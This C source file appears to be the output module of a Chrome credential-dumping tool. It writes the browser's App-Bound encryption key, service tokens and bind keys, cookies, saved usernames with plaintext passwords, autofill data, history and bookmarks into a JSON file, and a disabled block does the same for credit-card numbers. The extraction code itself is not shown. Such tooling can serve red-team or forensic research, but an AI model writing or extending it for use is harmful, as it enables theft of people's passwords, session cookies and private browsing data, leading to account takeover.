#include "Headers.h"

#define ASCII_JSON_WRITE(STR) WriteFile(hFile, STR, lstrlenA(STR), &dwWritten, NULL)

static VOID EscapeJsonString(IN LPCSTR pszInput, OUT LPSTR pszOutput, IN DWORD dwOutputSize)
{
    DWORD dwOut = 0;

    if (!pszInput || !pszOutput || dwOutputSize == 0)
        return;

    while (*pszInput && dwOut < dwOutputSize - 2)
    {
        switch (*pszInput)
        {
            case '"':  if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = '"'; }  break;
            case '\\': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = '\\'; } break;
            case '\b': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'b'; }  break;
            case '\f': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'f'; }  break;
            case '\n': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'n'; }  break;
            case '\r': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'r'; }  break;
            case '\t': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 't'; }  break;
            default:
                if ((UCHAR)*pszInput >= 0x20)
                    pszOutput[dwOut++] = *pszInput;
                break;
        }
        pszInput++;
    }
    pszOutput[dwOut] = '\0';
}

static VOID WriteJsonString(IN HANDLE hFile, IN LPCSTR pszValue)
{
    DWORD   dwWritten   = 0;
    LPSTR   pszEscaped  = NULL;
    DWORD   dwLen       = 0;

    if (!pszValue)
    {
        WriteFile(hFile, "null", 4, &dwWritten, NULL);
        return;
    }

    dwLen = lstrlenA(pszValue) * 2 + 1;
    if (!(pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen)))
    {
        WriteFile(hFile, "null", 4, &dwWritten, NULL);
        return;
    }

    EscapeJsonString(pszValue, pszEscaped, dwLen);

    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    WriteFile(hFile, pszEscaped, lstrlenA(pszEscaped), &dwWritten, NULL);
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);

    HEAP_FREE(pszEscaped);
}

static VOID WriteJsonBinaryAsString(IN HANDLE hFile, IN PBYTE pbData, IN DWORD dwLen)
{
    DWORD   dwWritten       = 0;
    LPSTR   pszEscaped      = NULL;
    DWORD   dwEscapedLen    = 0;

    if (!pbData || dwLen == 0)
    {
        WriteFile(hFile, "\"\"", 2, &dwWritten, NULL);
        return;
    }

    // Check if printable
    BOOL bPrintable = TRUE;
    for (DWORD i = 0; i < dwLen && bPrintable; i++)
    {
        if (pbData[i] < 0x20 && pbData[i] != '\t' && pbData[i] != '\n' && pbData[i] != '\r')
            bPrintable = FALSE;
        if (pbData[i] == 0x7F)
            bPrintable = FALSE;
    }

    if (bPrintable)
    {
        dwEscapedLen = dwLen * 2 + 1;
        if ((pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEscapedLen)))
        {
            // Null-terminate temporarily
            LPSTR pszTemp = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen + 1);
            if (pszTemp)
            {
                RtlCopyMemory(pszTemp, pbData, dwLen);
                pszTemp[dwLen] = '\0';
                EscapeJsonString(pszTemp, pszEscaped, dwEscapedLen);
                HEAP_FREE(pszTemp);

                WriteFile(hFile, "\"", 1, &dwWritten, NULL);
                WriteFile(hFile, pszEscaped, lstrlenA(pszEscaped), &dwWritten, NULL);
                WriteFile(hFile, "\"", 1, &dwWritten, NULL);
            }
            HEAP_FREE(pszEscaped);
            return;
        }
    }

    // Write as hex string
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    for (DWORD i = 0; i < dwLen; i++)
    {
        CHAR szHex[3];
        wsprintfA(szHex, "%02X", pbData[i]);
        WriteFile(hFile, szHex, 2, &dwWritten, NULL);
    }
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
}

static VOID WriteJsonHex(IN HANDLE hFile, IN PBYTE pbData, IN DWORD dwLen)
{
    DWORD dwWritten = 0;

    if (!pbData || dwLen == 0)
    {
        WriteFile(hFile, "\"\"", 2, &dwWritten, NULL);
        return;
    }

    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    for (DWORD i = 0; i < dwLen; i++)
    {
        CHAR szHex[3];
        wsprintfA(szHex, "%02X", pbData[i]);
        WriteFile(hFile, szHex, 2, &dwWritten, NULL);
    }
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
}

static VOID WriteJsonDword(IN HANDLE hFile, IN DWORD dwValue)
{
    CHAR    szNum[BUFFER_SIZE_16]   = { 0 };
    DWORD   dwWritten               = 0;

    StringCchPrintfA(szNum, BUFFER_SIZE_16, "%lu", dwValue);
    WriteFile(hFile, szNum, lstrlenA(szNum), &dwWritten, NULL);
}

static VOID WriteJsonTimestamp(IN HANDLE hFile, IN INT64 llTimestamp)
{
    CHAR        szFormatted[BUFFER_SIZE_64] = { 0 };
    DWORD       dwWritten                   = 0;
    FILETIME    FileTime                    = { 0 };
    SYSTEMTIME  SystemTime                  = { 0 };
    INT64       llAdjusted                  = 0;

    if (llTimestamp == 0)
    {
        ASCII_JSON_WRITE("null");
        return;
    }

    if (llTimestamp > 11644473600000000LL)
    {
        // WebKit/Chrome timestamp: microseconds since Jan 1, 1601
        llAdjusted = llTimestamp * 10;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }
    else
    {
        // Unix timestamp: seconds since Jan 1, 1970
        llAdjusted = (llTimestamp + 11644473600LL) * 10000000LL;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }

    if (FileTimeToSystemTime(&FileTime, &SystemTime) && SystemTime.wYear >= 1970 && SystemTime.wYear <= 2100)
    {
        StringCchPrintfA(szFormatted, BUFFER_SIZE_64, "\"%04d-%02d-%02d %02d:%02d:%02d\"", 
            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
        WriteFile(hFile, szFormatted, lstrlenA(szFormatted), &dwWritten, NULL);
    }
    else
    {
        ASCII_JSON_WRITE("null");
    }
}

BOOL WriteChromeDataToJson(IN PCHROME_DATA pChromeData, IN LPCSTR pszFilePath, IN BOOL bShowAll)
{
    HANDLE  hFile                   = INVALID_HANDLE_VALUE;
    DWORD   dwWritten               = 0;
    DWORD   dwCount                 = 0;
    CHAR    szNum[BUFFER_SIZE_64]   = { 0 };

    if (!pChromeData || !pszFilePath)
        return FALSE;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Write UTF-8 BOM
    WriteFile(hFile, "\xEF\xBB\xBF", 3, &dwWritten, NULL);

    ASCII_JSON_WRITE("{\n");

    // App-Bound Key
    ASCII_JSON_WRITE("  \"app_bound_key\": ");
    WriteJsonHex(hFile, pChromeData->pbAppBoundKey, pChromeData->dwAppBoundKeyLen);
    ASCII_JSON_WRITE(",\n\n");

    // Tokens
    dwCount = bShowAll ? pChromeData->dwTokenCount : min(pChromeData->dwTokenCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"tokens\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"service\": "); WriteJsonString(hFile, pChromeData->pTokens[i].pszService); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"token\": "); WriteJsonBinaryAsString(hFile, pChromeData->pTokens[i].pbToken, pChromeData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"bind_key\": "); WriteJsonHex(hFile, pChromeData->pTokens[i].pbBindKey, pChromeData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");

    // Cookies
    dwCount = bShowAll ? pChromeData->dwCookieCount : min(pChromeData->dwCookieCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"cookies\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"host\": "); WriteJsonString(hFile, pChromeData->pCookies[i].pszHostKey); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"path\": "); WriteJsonString(hFile, pChromeData->pCookies[i].pszPath); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromeData->pCookies[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"value\": "); WriteJsonBinaryAsString(hFile, pChromeData->pCookies[i].pbValue, pChromeData->pCookies[i].dwValueLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expires_utc\": "); WriteJsonTimestamp(hFile, pChromeData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");

    // Logins
    dwCount = bShowAll ? pChromeData->dwLoginCount : min(pChromeData->dwLoginCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"logins\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"origin_url\": "); WriteJsonString(hFile, pChromeData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"action_url\": "); WriteJsonString(hFile, pChromeData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"username\": "); WriteJsonString(hFile, pChromeData->pLogins[i].pszUsername); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"password\": "); WriteJsonBinaryAsString(hFile, pChromeData->pLogins[i].pbPassword, pChromeData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_created\": "); WriteJsonTimestamp(hFile, pChromeData->pLogins[i].llDateCreated); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_last_used\": "); WriteJsonTimestamp(hFile, pChromeData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");
    
    /*
    // Credit Cards
    dwCount = bShowAll ? pChromeData->dwCreditCardCount : min(pChromeData->dwCreditCardCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"credit_cards\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name_on_card\": "); WriteJsonString(hFile, pChromeData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"nickname\": "); WriteJsonString(hFile, pChromeData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"card_number\": "); WriteJsonBinaryAsString(hFile, pChromeData->pCreditCards[i].pbCardNumber, pChromeData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expiration_month\": "); WriteJsonDword(hFile, pChromeData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expiration_year\": "); WriteJsonDword(hFile, pChromeData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_modified\": "); WriteJsonTimestamp(hFile, pChromeData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");
    */

    // Autofill
    dwCount = bShowAll ? pChromeData->dwAutofillCount : min(pChromeData->dwAutofillCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"autofill\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromeData->pAutofill[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"value\": "); WriteJsonString(hFile, pChromeData->pAutofill[i].pszValue); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"count\": "); WriteJsonDword(hFile, pChromeData->pAutofill[i].dwCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_created\": "); WriteJsonTimestamp(hFile, pChromeData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");

    // History
    dwCount = bShowAll ? pChromeData->dwHistoryCount : min(pChromeData->dwHistoryCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"history\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"url\": "); WriteJsonString(hFile, pChromeData->pHistory[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"title\": "); WriteJsonString(hFile, pChromeData->pHistory[i].pszTitle); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"visit_count\": "); WriteJsonDword(hFile, pChromeData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"last_visit_time\": "); WriteJsonTimestamp(hFile, pChromeData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n\n");

    // Bookmarks
    dwCount = bShowAll ? pChromeData->dwBookmarkCount : min(pChromeData->dwBookmarkCount, MAX_DISPLAY_COUNT);
    ASCII_JSON_WRITE("  \"bookmarks\": [\n");
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromeData->pBookmarks[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"url\": "); WriteJsonString(hFile, pChromeData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_added\": "); WriteJsonTimestamp(hFile, pChromeData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ]\n");

    ASCII_JSON_WRITE("}\n");

    CloseHandle(hFile);

    return TRUE;
}

